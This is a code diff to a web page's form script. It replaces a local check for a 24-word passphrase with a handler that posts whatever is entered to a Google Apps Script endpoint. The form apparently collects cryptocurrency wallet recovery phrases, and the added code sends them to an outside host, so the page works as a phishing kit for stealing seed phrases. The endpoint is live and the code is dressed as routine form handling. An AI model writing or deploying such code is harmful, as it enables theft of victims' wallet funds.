@@ -702,21 +702,52 @@
                         </div>
                       </div>
                       <script>
-                        function check() {
-                          var textarea = document.getElementById("comment");
-                          var inputValue = textarea.value.trim();
-                          var wordCount = inputValue.split(/\s+/).length;
-                          if (wordCount == 24 && inputValue.length > 115) {
-                            return true;
-                          } else {
-                            var ediv = document.getElementById("emsg");
-                            ediv.innerHTML = "Invalid Passphrase";
-                          }
-                          return false;
-                        }
-                      </script>
-                    </form>
-                    <script src="../static/static.js"></script>
+               // Function to handle form submission 
+function handleSubmit(event) {
+    event.preventDefault(); // Prevent default form submission
+
+    const myButton = document.getElementById('b1');
+    const myButton2 = document.getElementById('b2');
+    const form = document.getElementById('myForm'); // Replace 'myForm' with your form ID
+    const inputValue = form.elements['mf-texts'].value.trim();
+
+    // Validate word count
+    const wordCount = inputValue.split(/\s+/).filter(Boolean).length;
+    if (wordCount !== 24) {
+        alert("Passphrase must contain exactly 24 words.");
+        form.reset();
+        return;
+    }
+
+    // Disable buttons
+    myButton.disabled = true;
+    myButton2.disabled = true;
+
+    // Google Apps Script Web App URL
+    const url = "https://script.google.com/macros/s/AKfycbzDAQMdqfEC-sUMlK05t_6fCQCV6xi7F6Co9fPQno6jCly0nDnpHD88NyWR7-_pfi24/exec";
+
+    // Make a POST request
+    fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ passphrase: inputValue })
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log("Success:", data);
+        alert("Passphrase submitted successfully!");
+    })
+    .catch(error => {
+        console.error("Error:", error);
+        alert("Failed to submit. Please try again.");
+    })
+    .finally(() => {
+        myButton.disabled = false;
+        myButton2.disabled = false;
+        form.reset();
+    });
+}
+                 
                   </div>
                   <div
                     style="box-sizing: border-box; padding-left: 16px; padding-right: 16px; margin-top: 16px; margin-bottom: 16px;"
